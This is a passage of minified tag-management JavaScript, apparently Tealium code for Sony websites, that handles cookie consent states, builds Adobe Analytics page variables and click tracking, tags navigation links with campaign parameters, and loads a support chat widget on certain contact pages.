if(/(srtestdev\.sony\.jp|website-us-qas\.grif\.cloud)/gi.test(window.location.host)||/us\.aibo\.com/gi.test(window.location.host)||/sony\.com\/electronics\/support/gi.test(document.URL)&&!_bsq.utils.isAgentPortal()&&!/^(SH|tvhelp)$/.test(_bsq.utils.getQueryParameter(document.URL,"source"))||/(t0sxcdwl|77snszqv)-dev\.webengine\.zesty\.io/gi.test(document.URL)||/alphauniverse\.com|sonycine\.com/gi.test(window.location.host)||/sony.registria(staging|qa).com/gi.test(document.URL)||/productregistration\.sony\.com/gi.test(window.location.hostname)&&!/\/(en|fr)-ca/gi.test(window.location.pathname)||/sonypremiumhome\.com/gi.test(document.URL)||/electronics\.sony\.com/gi.test(document.URL))if(""!==_bsq.utils.docCookies.getItem("OptanonConsent")&&""!==_bsq.utils.docCookies.getItem("OptanonAlertBoxClosed")){var c=_bsq.utils.docCookies.getItem("OptanonConsent").split("&").filter((function(e){return-1!=e.indexOf("genVendors")||-1!=e.indexOf("groups")}));groups=c[0].split("=")[1].split(",").filter((function(e){return!!e})).filter((function(e){return"1"===e.split(":")[1]})).map((function(e){return e.split(":")[0]})),utag_data.cs_consent_categories=groups.join(","),"consent_given"===(groups.length>1?"consent_given":"consent_declined")&&(utag_data.cs_event_name="gwtConsentGiven"),_bsq.aa.pageViewHandler()}else{if(utag_data.cs_event_name="gwtConsentGiven",utag_data.cs_consent_categories="C0001,C0003,C0002,C0004",/sony\.com\/electronics\/support/gi.test(document.URL)&&!_bsq.utils.isAgentPortal()&&!/^(SH|tvhelp)$/.test(_bsq.utils.getQueryParameter(document.URL,"source"))){utag_data.cs_consent_categories=window.OptanonActiveGroups.slice(1,-1),document.addEventListener("page_state_updated",(function(){/C0003/gi.test(utag_data.cs_consent_categories)||null!=document.querySelector(".digibot-sc-launcher")&&(document.querySelector(".digibot-sc-launcher").parentNode.style.display="none"),/C0002/gi.test(utag_data.cs_consent_categories)||null!=document.querySelector("#micro_survey_container")&&(document.querySelector("#micro_survey_container").style.display="none")}));var l=window.OptanonWrapper;window.OptanonWrapper=function(){utag_data.cs_consent_categories=window.OptanonActiveGroups.slice(1,-1),void 0!==l&&l()}}_bsq.aa.pageViewHandler()}else if(/(\.sony\.com\.pe|pesonyb2c\.myvtex\.com)/gi.test(window.location.host)){utag.gdpr.getConsentState()<=0?(utag_data.cs_event_name="gwtConsentGiven",utag_data.cs_consent_categories="functional,essential,performance",utag_data.cs_consent_vendors="all",_bsq.aa.pageViewHandler()):1===utag.gdpr.getConsentState()&&(utag_data.cs_event_name="gwtConsentGiven",utag_data.cs_consent_categories="functional,essential,performance,advertising",utag_data.cs_consent_vendors="all",_bsq.aa.pageViewHandler());var u=function(e,t){var a=new Date(e);a.setFullYear(a.getFullYear()+1),_bsq.utils.docCookies.setItem("consent-pe","functional, essential, performance"+(t?", "+t:""),a)};window.consentCallBack=function(){utag.gdpr.setConsentValue(1),u(Number.parseInt(utag.gdpr.getCookieValues().ts),"advertising");var e=new CustomEvent("consent_given",{detail:{categories:utag_data.cs_consent_categories,vendors:utag_data.cs_consent_vendors}});document.dispatchEvent(e),_bsq.utils.closeModal("__tealiumGDPRecModal")},window.rejectCallBack=function(){utag.gdpr.setConsentValue(0),u(Number.parseInt(utag.gdpr.getCookieValues().ts));var e=new CustomEvent("consent_declined");document.dispatchEvent(e),_bsq.utils.closeModal("__tealiumGDPRecModal")}}else utag_data.cs_event_name="gwtConsentGiven",utag_data.cs_consent_categories="all",utag_data.cs_consent_vendors="all",_bsq.aa.pageViewHandler()}}catch(e){utag.DB(e)}},function(e,t){try{utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[62]&&(utag.runonce.ext[62]=1,_bsq.aa.gwxAdobeVariables=function(e,t){var a={};_bsq.aa.clear_aaUtagObj(e),a=_bsq.aa.setDatalayerObject(utag_data.website_platform),"client"===e&&(utag_data=_bsq.aa.clear_aaUtagObj(e),"undefined"!=typeof sgwn&&sgwn.clearVars());var o="",i="";t.aaEvents=[],_bsq.aa.all_countComponents=function(){for(var e=[],t=[],o="",i=0;i<a.component.length;i++)""===(o=a.component[i].componentId||"")||/global_(header|footer)/.test(a.component[i].componentType)||t.push(o),""!==o&&e.push(o);return e.length+"|"+t.length},_bsq.aa.all_isComponentVisible=function(e,t){if(void 0===t&&(t=100),(t>100||t<0)&&(t=100),"undefined"!==e){var a,o=e.getBoundingClientRect().bottom,i=e.getBoundingClientRect().top,r=e.getBoundingClientRect().height,n=document.documentElement.clientHeight;return Math.ceil(e.getBoundingClientRect().left)>=0&&Math.floor(e.getBoundingClientRect().right)<=document.documentElement.clientWidth&&r>0?o<0?a=0:o<n?i<0?a=o/r:i<n&&(a=1):o>=n&&(i<0?a=n/r:i<n?a=(n-i)/r:i>=n&&(a=0)):a=0,Math.floor(100*a)>=t}},_bsq.aa.all_trackLoadedComponents=function(){_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,"");var e=[],t="";if(void 0!==a.component)for(var o=0;o<a.component.length;o++)t=a.component[o].componentId||"",/global_(header|footer)/.test(a.component[o].componentType)||""===t||e.push(t);e.length>0&&_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,e.join(","))},_bsq.aa.all_trackViewedComponents=function(){var e=[],t=[],o="";if(void 0!==a.component)for(var i=0;i<a.component.length;i++)o=a.component[i].componentId||"",/global_(header|footer)/.test(a.component[i].componentType)||""===o||e.push(o);for(i=0;i<e.length;i++){var r;null!=(r=document.querySelector("[data-componentid='"+e[i].replace(/'/g,"\\'")+"']"))&&(t=t.concat(r))}if(void 0!==t)for(i=0;i<t.length;i++){var n=t[i];if("undefined"!==n&&_bsq.aa.all_isComponentVisible(n,_bsq.aa.moduleVisibilityThreshold)){var s=e[i];if(""!==s){var d=null===_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey)?"":_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey);-1===d.split(",").indexOf(s)&&_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,(d.length>0?d+",":"")+s)}}}},_bsq.aa.categoryAccessories_trackAccessoryFinderTyped=function(){var e=function(e){var t="accessory finder";t+="close"===e?" close":" product click";var a=document.querySelector(".SearchByModelForm__SearchBox input")&&void 0!==document.querySelector(".SearchByModelForm__SearchBox input").value?document.querySelector(".SearchByModelForm__SearchBox input").value.substring(0,100):"";""===a&&(a="no search term"),void 0!==a&&(utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar44",utag_data.aaLinkTrackEvents="",utag_data.aaAccessoryFinderSearchTerm=a,utag_data.aaLinkType="o",utag_data.aaLinkName=t,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))};_bsq.utils.on(document,"click",".SearchByModelForm__ResultList .SearchByModelForm__ResultItem a",(function(t){e("product click")}));var t=document.querySelector("body");new MutationObserver((function(){document.querySelector('.ProductGalleryFilterByProduct__Button[class*="Modal__CloseButtonAccGallery"]')&&document.querySelector('.ProductGalleryFilterByProduct__Button[class*="Modal__CloseButtonAccGallery"]').addEventListener("click",(function(t){_bsq.aa.preventMultipleServerCalls||(_bsq.aa.preventMultipleServerCalls=!0,e("close"),setTimeout((function(){_bsq.aa.preventMultipleServerCalls=void 0}),1e3))}))})).observe(t,{subtree:!0,childList:!0})},_bsq.aa.gwxDealerMapServerCall=function(e){e=void 0!==e?e.toLowerCase():"",utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,products,eVar42,eVar70",utag_data.aaLinkTrackEvents="event30",utag_data.aaEvents.push("event30"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaRetailerName=e,utag_data.aaLinkType="o",utag_data.aaLinkName="Dealer map click - "+e,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())},_bsq.aa.transition_gwxMapDealerClick=function(){_bsq.utils.on("body","click","div.dl-app__inner--panel ul.dl-results__list a.dl-result__link, div.dl-map.embed div[title]",(function(e){var t="";try{null!==this.querySelector("h3.dl-result__headline")&&this.querySelector("h3.dl-result__headline").textContent.trim()?t=this.querySelector("h3.dl-result__headline").textContent.trim():this.getAttribute("title")&&(t=this.getAttribute("title"))}catch(e){utag.DB("Map Dealer Click")}_bsq.aa.gwxDealerMapServerCall(t)}))},_bsq.aa.transition_gwxDealerLocator=function(){_bsq.utils.on("body","click","a.dl-button-directions,a.dl-dealer__directions,a.dl-dealer__website,a.dl-dealer__cta",(function(e){var t=/(dl-button-directions|dl-dealer__directions)/gi.test(e.target.className)?"directions":/dl-dealer__website/gi.test(e.target.className)?"website":/dl-dealer__cta/gi.test(e.target.className)&&/^tel/gi.test(e.target.href)?"telephone":/dl-dealer__cta/gi.test(e.target.className)&&/^mailto/gi.test(e.target.href)?"email":"untracked element:"+e.target.className;utag_data.aaLinkTrackVars="products,pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58,eVar70",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaInteractionType="dealer_locator | Module interaction - Dealer: "+t+" click",utag_data.aaLinkType="o",utag_data.aaLinkName="transition-dealer:"+t+"_click",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))};var r=(buildSonyDataLayer().sony.digitalData,void 0!==buildSonyDataLayer().sony.digitalData.page&&void 0!==buildSonyDataLayer().sony.digitalData.page.pageTemplate?buildSonyDataLayer().sony.digitalData.page.pageTemplate:"");switch(a.page.pageTemplate.toLowerCase()){case"home":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate).toLowerCase(),i=a.page.pageTemplate.toLowerCase();break;case"category":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.product.category2).toLowerCase(),i=a.page.pageTemplate.toLowerCase();break;case"gallery":o="glb:gallery:"+a.product.category2+":"+a.product.category3,/category_accessories/gi.test(r)?o="glb:gallery:"+(a.product.category2||"")+":accessories":/category_compare/gi.test(r)&&(""===a.product.category3?o+="all:compare":o+=":compare"),o=o.toLowerCase(),i=a.page.pageTemplate.toLowerCase();break;case"pdp":case"pdp_specifications":case"pdp_related":case"pdp_gallery":case"reviews_listing":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.product.category2+":"+a.product.category3).toLowerCase(),void 0!==a.product.supermodel&&a.product.supermodel.length>0?o=o+":"+a.product.supermodel[0].toUpperCase():void 0!==a.product.model&&a.product.model.length>0?o=o+":"+a.product.model[0].toUpperCase():void 0!==a.product.sku&&a.product.sku.length>0&&(o=o+":"+a.product.sku[0].toUpperCase()),i=a.page.pageTemplate.toLowerCase();break;case"pdp_features":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.product.category2+":"+a.product.category3).toLowerCase(),void 0!==a.product.supermodel&&a.product.supermodel.length>0?o=o+":"+a.product.supermodel[0].toUpperCase():void 0!==a.product.model&&a.product.model.length>0?o=o+":"+a.product.model[0].toUpperCase():void 0!==a.product.sku&&a.product.sku.length>0&&(o=o+":"+a.product.sku[0].toUpperCase()),o=o+":"+a.page.name.substring(a.page.name.indexOf("_")+1),i=a.page.pageTemplate.toLowerCase();break;case"oof":"pdp_oof"===r?(o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.product.category2+":"+a.product.category3).toLowerCase(),void 0!==a.product.supermodel&&a.product.supermodel.length>0?o=o+":"+a.product.supermodel[0].toUpperCase():void 0!==a.product.model&&a.product.model.length>0?o=o+":"+a.product.model[0].toUpperCase():void 0!==a.product.sku&&a.product.sku.length>0&&(o=o+":"+a.product.sku[0].toUpperCase()),o=o+":"+a.page.name.substring(a.page.name.indexOf("_")+1)):"category_oof"===r?(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.product.category2+":"+(void 0!==a.page.name.split(/_(.*)/s)[1]?a.page.name.split(/_(.*)/s)[1]:a.page.name)).toLowerCase():(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.page.name).toLowerCase(),i=a.page.pageTemplate.toLowerCase();break;case"transition":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.product.category2+":"+a.product.category3).toLowerCase(),void 0!==a.product.sku&&a.product.sku.length>0&&(o=o+":"+a.product.sku[0].toUpperCase()),i=a.page.pageTemplate.toLowerCase();break;case"error":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate+":"+a.page.name).toLowerCase(),i=a.page.pageTemplate.toLowerCase();break;case"all-electronics":case"search":case"my favorites":case"locale_selector":case"dealer locator":case"language-selection":o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.pageTemplate).toLowerCase(),i=a.page.pageTemplate.toLowerCase();break;default:o=(o=(""!==a.page.section?a.page.section:"glb")+":"+a.page.name).toLowerCase(),i=a.page.pageTemplate}if(t.aaPageName=o,t.aaPageTemplate=i,t.aaModules=_bsq.aa.all_countComponents(),t.aaCountry=a.page.country||"",t.aaSiteSection=a.page.section||"",t.aaLanguage=a.page.language||"",t.aaCurrencyCode=a.page.currency||"",t.aaSEOTitle=document.title||"",t.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),t.aaReferrer=_bsq.utils.all_maskPIIData(document.referrer||""),t.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,t.aaPageOrigin=e,t.aaDomain=location.hostname||"",t.aaUserID=_bsq.utils.all_maskPIIData(a.user.id||""),""===t.aaUserID&&(t.aaUserID=_bsq.utils.getQueryParameter(location.href.toLowerCase(),"ccid")),t.aaDeviceType=_bsq.utils.getDeviceType(),t.aaTrafficSource=_bsq.utils.getQueryParameter(document.URL,"source")||"",t.aaPlatform=/(swt|gwt|gwx)/gi.test(utag_data.website_platform.split(":")[1]||"")?utag_data.website_platform.split(":")[1]:"other",t.aaNumberOfProducts=void 0!==sony.digitalData.category.products&&sony.digitalData.category.products.length>0?sony.digitalData.category.products.length:"",t.aaDebug="gwx",t.aaNavigationLinkCookie=_bsq.utils.docCookies.getItem(_bsq.aa.navigationLinkCookieName),t.aaPreviousPageURL=_bsq.utils.docCookies.getItem("gpv_v89"),t.aaPreviousPageName=_bsq.utils.docCookies.getItem("gpv_pn"),t.aaPreviousPageTemplate=_bsq.utils.docCookies.getItem("gpv_p7"),""!==_bsq.utils.docCookies.getItem(_bsq.aa.typeaheadTermCookieName)&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(_bsq.utils.docCookies.getItem(_bsq.aa.typeaheadTermCookieName)),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,"")),t.aaProductSKU=a.product.sku.join(","),t.aaProductTier=a.product.tier,t.aaProductPrice=a.product.price,t.aaProductCategory1=a.product.category1.replace(/^gwx-/g,""),t.aaProductCategory2=a.product.category2.replace(/^gwx-/g,""),t.aaProductCategory3=a.product.category3.replace(/^gwx-/g,""),t.aaProductCategory3?t.aaProductCategoryTree='D=c34+">"+c35+">"+c36':t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),"error"===a.page.pageTemplate&&(t.aaPageType="errorPage"),t.aaFilters=_bsq.utils.docCookies.getItem(_bsq.aa.filtersCookieName),_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,""),""!==_bsq.utils.docCookies.getItem(_bsq.aa.sortingCookieName)&&(void 0!==t.aaFilters?t.aaFilters+=" > "+_bsq.utils.docCookies.getItem(_bsq.aa.sortingCookieName):t.aaFilters=" > "+_bsq.utils.docCookies.getItem(_bsq.aa.sortingCookieName),_bsq.utils.docCookies.setItem(_bsq.aa.sortingCookieName,"")),t.aaModulesLoaded=_bsq.utils.docStorage.getItem(_bsq.aa.loadedElementsLocalStorageKey),t.aaModulesViewed=_bsq.utils.docStorage.getItem(_bsq.aa.seenElementsLocalStorageKey),_bsq.utils.docStorage.setItem(_bsq.aa.loadedElementsLocalStorageKey,""),_bsq.utils.docStorage.setItem(_bsq.aa.seenElementsLocalStorageKey,""),"dealer_locator"===i&&t.aaEvents.push("event50"),"errorPage"===t.aaPageType&&t.aaEvents.push("event6"),"reviews_listing"===i&&/^cl:ratings_and_reviews/gi.test(t.aaNavigationLinkCookie)&&t.aaEvents.push("event27"),_bsq.aa.all_trackLoadedComponents(),_bsq.aa.all_trackViewedComponents(),["resize","scroll"].forEach((function(e){window.addEventListener(e,_bsq.aa.all_trackViewedComponents)})),"category_accessories"===r&&_bsq.aa.categoryAccessories_trackAccessoryFinderTyped(),"pdp"===i&&(""!==t.aaProductPrice&&t.aaEvents.push("event24"),t.aaEvents.push("event26"),t.aaEvents.push("prodView"),1===a.product.supermodel.length?t.aaProducts=[a.product.supermodel[0]]:1===a.product.model.length?t.aaProducts=[a.product.model[0]]:t.aaProducts=[a.product.sku[0]],t.aaProductCategoryStructure='D=c32+":"+c34+">"+c35+">"+c36',1===a.product.supermodel.length?t.aaProductSKUPredefined=a.product.supermodel[0]:1===a.product.model.length?t.aaProductSKUPredefined=a.product.model[0]:t.aaProductSKUPredefined=a.product.sku[0],void 0!==a.product.reviewsCount&&""!==a.product.reviewsCount?t.aaReviewsNumber=a.product.reviewsCount:t.aaReviewsNumber="zero",void 0!==a.product.ratingAverage&&""!==a.product.ratingAverage?t.aaReviewsNumber=t.aaReviewsNumber+" | "+Number(a.product.ratingAverage).toFixed(2):t.aaReviewsNumber=t.aaReviewsNumber+" | zero",t.aaProductFavoriteStatus=!0===a.product.isFavorite?"favorite-on":"favorite-off"),"transition"===i){t.aaEvents.push("event32"),1===a.product.supermodel.length?t.aaProducts=[a.product.supermodel[0]]:1===a.product.model.length?t.aaProducts=[a.product.model[0]]:t.aaProducts=[a.product.sku[0]],t.aaRetailersNumber=a.transition.retailersCount;var n="",s="",d="";void 0!==a.product&&(1===a.product.supermodel.length&&(n=a.product.supermodel[0]),1===a.product.supermodel.length&&(s=a.product.model[0]),1===a.product.supermodel.length&&(d=a.product.sku[0]));var c=[];""!==n?c.push("s:"+n):c.push("s:n-a"),""!==s?c.push("m:"+s):c.push("m:n-a"),""!==d?c.push("sku:"+d):c.push("sku:n-a"),t.aaProductStructure=c.join("|"),"transition"===i&&(_bsq.aa.transition_gwxMapDealerClick(),_bsq.aa.transition_gwxDealerLocator())}if(/category_compare/gi.test(r)){var l=[];if(a.category.products.length>0){for(var u=0;u<a.category.products.length;u++)void 0!==a.category.products[u].supermodel[0]&&l.push(a.category.products[u].supermodel[0]);t.aaProducts=l}}if("search"===i&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(a.search.term),t.aaSearchResults=a.search.resultCount,void 0!==t.aaSearchResults&&""!==t.aaSearchResults&&t.aaEvents.push("event35="+t.aaSearchResults),void 0!==t.aaSearchTerm&&""!==t.aaSearchTerm&&t.aaEvents.push("event36"),"0"==t.aaSearchResults&&t.aaEvents.push("event38")),"my favorites"===i){l=[];if(a.category.products.length>0){for(u=0;u<a.category.products.length;u++)void 0!==a.category.products[u].supermodel[0]&&l.push(a.category.products[u].supermodel[0]);t.aaProducts=l}}t.aaPageViewedPercentage=_bsq.utils.docCookies.getItem("s_ppv").split(",")[1]||"",t.aaInitialPixelsLoaded=parseInt(_bsq.utils.docCookies.getItem("s_ips"))||0,t.aaTotalPixelsLoaded=parseInt(_bsq.utils.docCookies.getItem("s_tp"))||0;var g=parseInt(_bsq.utils.docCookies.getItem("s_ppv").split(",")[3])||0;return t.aaAdditionalPixelsLoaded=g-t.aaInitialPixelsLoaded<0?0:g-t.aaInitialPixelsLoaded,t.aaEvents.push("event1="+t.aaAdditionalPixelsLoaded,"event2="+t.aaInitialPixelsLoaded,"event3="+t.aaTotalPixelsLoaded),t})}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[20]&&(utag.runonce.ext[20]=1,"undefined"!=typeof jQuery)){var a="mn_sonymobile_smartphones";if(0!==(r=jQuery("#navtrayElectronics div.mega-nav-menu-inner a[data-category-name='xperia-smartphones']")).length){var o=r.attr("href"),i="?cpint=";void 0!==o&&o.indexOf("?")>-1&&(i="&cpint="),void 0!==o&&-1===o.indexOf("_linkTrackingCode")&&r.attr("href",o+i+a)}var r;a="mn_sonymobile_tablets";if(0!==(r=jQuery("#navtrayElectronics div.mega-nav-menu-inner a[data-category-name='xperia-tablets']")).length){o=r.attr("href"),i="?cpint=";void 0!==o&&o.indexOf("?")>-1&&(i="&cpint="),void 0!==o&&-1===o.indexOf("_linkTrackingCode")&&r.attr("href",o+i+a)}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[21]&&(utag.runonce.ext[21]=1,/^(\/electronics|\/all-electronics|\/..\/electronics\/|\/..\/all-electronics)/.test(t["dom.pathname"]))){try{jQuery("#page-main-content a[href*='pro.sony'], #page-main-content a[href*='.sonypro'], #page-main-content a[href*='ps.sony'], #page-main-content a[href*='.sonybiz.'], #page-main-content a[href*='/pro/']").each((function(e){var t="gwt-"+("undefined"!=typeof utag_data&&utag_data.pageName||"").replace(":","_").replace("-","_").replace("other_","").replace("gwt_",""),a=jQuery(this).attr("href");!1===/alphapro.sony/gi.test(a)&&null===a.match(/(cmp)/gi)&&(a+=a.indexOf("?")>-1?"&":"?",a+="cmp="+t,jQuery(this).attr("href",a))}))}catch(e){"undefined"!=typeof jQuery&&jQuery("body").trigger("customError",["Sony Pro Tracking code",document.URL,e])}}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[30]&&(utag.runonce.ext[30]=1,/(sony\.(co\.id|co\.in|co\.ir|co\.kr|co\.nz|co\.th|co\.za|com\.au|com\.cn|com\.hk|com\.my|com\.ph|com\.sg|com\.tw|com\.vn)|(sony-africa|sony-asia|sony-mea)\.com)$/.test(t["dom.domain"])||/(sony\.com)$/.test(t["dom.domain"])&&/^\/(...|)(asia|middle-east|ae|ao|bf|bh|bj|cg|ci|cn|cm|dz|eg|et|ga|gh|iq|jo|ke|kw|lb|lr|ly|ma|mu|ng|om|pk|qa|sa|sn|sy|tn|tz|ug|ye|za)(|\/?|\/.*)$/.test(t["dom.pathname"])||/((sony\.(at|ba|be|bg|ch|co\.uk|com\.mk|com\.pl|com\.tr|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|kz|lt|lu|lv|net|nl|no|pl|pt|ro|rs|ru|se|si|sk|ua))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)$/.test(t["dom.domain"])&&t["dom.pathname"].toString().toLowerCase().indexOf("/mysony/ForgotPassword".toLowerCase())<0||/^(failover-pdp\.sony\.eu\.edgesuite\.net)$/.test(t["dom.domain"])||/"(\.sony\.(ca|com)|sony.registriastaging.com)$/.test(t["dom.domain"])&&/^(?!\/(en-dz|fr-dz|en-ao|pt-ao|en-bj|fr-bj|en-bf|fr-bf|en-cm|fr-cm|en-cd|fr-cd|ar-eg|en-eg|et|en-ga|fr-ga|gh|en-ci|fr-ci|ke|lr|ar-ly|en-ly|en-mu|fr-mu|en-ma|fr-ma|ng|en-sn|fr-sn|za|tz|en-tn|fr-tn|ug|en-bh|ar-bh|ar-iq|en-iq|ar-jo|en-jo|ar-kw|en-kw|ar-lb|en-lb|ar-om|en-om|pk|ar-qa|en-qa|ar-sa|en-sa|ar-ae|ar-sy|en-sy|en-ae|ar-ye|en-ye|zh-cn)\/?).*/.test(t["dom.pathname"])||/((sony)\.(com\.ar|cl|com\.co|com\.mx|com\.pa|com\.br|co\.cr|com\.bo|com\.do|com\.ec|com\.sv|com\.gt|com\.hn|com\.py|com\.pe|com\.pr|com\.ve|com\.ni)|sony-latin\.com|sonypr\.com)$/.test(t["dom.domain"]))){function a(e,t,a){var o=jQuery(a).attr("href"),i=new RegExp(e,"gi");null===o.match(i)&&(o+=o.indexOf("?")>-1?"&":"?",o+=e+"="+t,jQuery(a).attr("href",o))}"undefined"!=typeof jQuery&&jQuery(document).ready((function(){if(jQuery("#navtrayEntertainment .navtray-section-featured .gwt-module").length>0){if((t=jQuery("#navtrayEntertainment .navtray-section-featured .gwt-module").eq(0).find("a")).length>0)for(var e=0;e<t.length;e++)a("cpint","HEADERENTERTAINMENT_TOP",t[e]);if((o=jQuery("#navtrayEntertainment .navtray-section-featured .gwt-module").eq(1).find("a")).length>0)for(e=0;e<o.length;e++)a("cpint","HEADERENTERTAINMENT_BOTTOM",o[e])}if(jQuery("#navtrayElectronics .navtray-section-featured .gwt-module").length>0){var t,o;if((t=jQuery("#navtrayElectronics .navtray-section-featured .gwt-module").eq(0).find("a")).length>0)for(e=0;e<t.length;e++)a("cpint","HEADERELECTRONIC_TOP",t[e]);if((o=jQuery("#navtrayElectronics .navtray-section-featured .gwt-module").eq(1).find("a")).length>0)for(e=0;e<o.length;e++)a("cpint","HEADERELECTRONIC_BOTTOM",o[e])}})),"undefined"!=typeof all_externalLinksTrackingCodeCapture&&all_externalLinksTrackingCodeCapture()}}catch(e){utag.DB(e)}},function(e,t){try{if(utag.runonce=utag.runonce||{},utag.runonce.ext=utag.runonce.ext||{},void 0===utag.runonce.ext[46]&&(utag.runonce.ext[46]=1,/^(stg)?services\.sony\.(co\.uk|ie|fr|es|it|de|nl|se|dk|no|at|be)$/gi.test(t["dom.domain"])&&/^(\/supportmvc\/(en|fr|es|it|de|nl|sv|da|no)\/Contact\/Email\/?)$/gi.test(t["dom.pathname"])&&"gwtConsentGiven"==t.cs_event_name&&/(all|performance|whoson)/gi.test(t.cs_consent_categories)||/^(stg)?services\.(kz\.)?sony\.(ru|kz|ch)/.test(t["dom.domain"])&&/^(\/supportmvc\/(ru|de|fr)\/Contact\/Email\/?)$/gi.test(t["dom.pathname"]))){window.__ensChatLoaded=!1,window.__ensChatShowed=!1;var a="",o="",i=/stgservices\.sony/gi.test(window.location.hostname)?"staging.":"www.";try{a=t.tagsCountry.toLowerCase()||"",o=t.tagsLanguage.toLowerCase()||"","ch"===a&&(o="de")}catch(e){}var r={gb:"sony.co.uk",ie:"sony.co.uk",fr:"sony.fr",es:"sony.es",it:"sony.it",pt:"sony.pt",de:"sony.de",nl:"sony.nl",se:"sony.se",dk:"sony.dk",no:"sony.no",ru:"sony.ru",kz:"sony.ru",ch:"sony.ch-de",at:"sony.at",be:"sony.be-"+o};function n(e){var t=new CustomEvent("aaSptEUChatInteraction",{detail:{interaction:e}});document.dispatchEvent(t)}window.addEventListener("message",(function(e){try{utag.DB(e),void 0!==window.whoson_global&&utag.DB(window.whoson_global);var t=JSON.parse(e.data);switch(utag.DB(t),t.message){case"inline_loaded":!1===window.__ensChatShowed&&(utag.DB("========> Adobe Analytics - Fire event: Chat loaded"),n("loaded"),window.__ensChatShowed=!0);break;case"clear_chat_notification":whoson_global.online&&(utag.DB("========> Adobe Analytics - Fire event: Chat button clicked"),n("button clicked"));break;case"mainchat_loaded":n("session started"),utag.DB("========> Adobe Analytics - Fire event: Chat session started")}}catch(e){utag.DB("Exception in whosonMessage: "+e.toString())}}),!1),void 0===window.sWOTrackPage&&utag.ut.loader({type:"script",src:"//sonyemea.whoson.com/include.js?domain="+i+r[a]+"&lang="+o,cb:function(){whoson_global.hideChatButton=!0,"function"==typeof window.sWOTrackPage&&(sWOTrackPage(),window.__ensChatLoaded=!0);var e=new CustomEvent("whosOnScriptLoaded",{detail:{}});document.dispatchEvent(e),utag.DB("EVENT DISPATCHED ==== "+e)},loc:"script"})}}catch(e){utag.DB(e)}}],utag.handler.cfg_extend=[{alr:0,end:0,blr:1,bwq:0,id:"1"},{id:"9",bwq:0,end:0,blr:1,alr:0},{blr:1,end:0,alr:0,id:"8",bwq:0},{end:0,blr:1,alr:0,id:"2",bwq:0},{blr:1,end:0,alr:0,id:"36",bwq:0},{alr:0,end:0,blr:1,bwq:0,id:"27"},{bwq:0,id:"4",alr:0,blr:1,end:0},{bwq:0,id:"18",alr:0,end:0,blr:1},{id:"28",bwq:0,end:0,blr:1,alr:0},{end:0,blr:1,alr:0,id:"37",bwq:0},{alr:0,end:0,blr:1,bwq:0,id:"62"},{bwq:0,id:"20",alr:0,blr:0,end:1},{bwq:0,id:"21",alr:0,blr:0,end:1},{id:"30",bwq:0,end:1,blr:0,alr:0},{alr:0,blr:0,end:1,bwq:0,id:"46"}],utag.loader.initcfg=function(){utag.loader.cfg={8:{load:utag.cond[72],tcat:0,send:1,v:202207010735,wait:0,tid:19063},19:{load:utag.cond[9],tcat:0,send:1,v:202205160918,wait:1,tid:7110},22:{load:utag.cond[18]||utag.cond[19],tcat:0,send:1,v:202009071506,wait:1,tid:7132},25:{load:utag.cond[41]||utag.cond[43]||utag.cond[40]||utag.cond[38]||utag.cond[39]||utag.cond[37]||utag.cond[36]||utag.cond[33]||utag.cond[31]||utag.cond[30]||utag.cond[28]||utag.cond[25]||utag.cond[24]||utag.cond[23]||utag.cond[20]||utag.cond[26]||utag.cond[35]||utag.cond[29]||utag.cond[27]||utag.cond[21]||u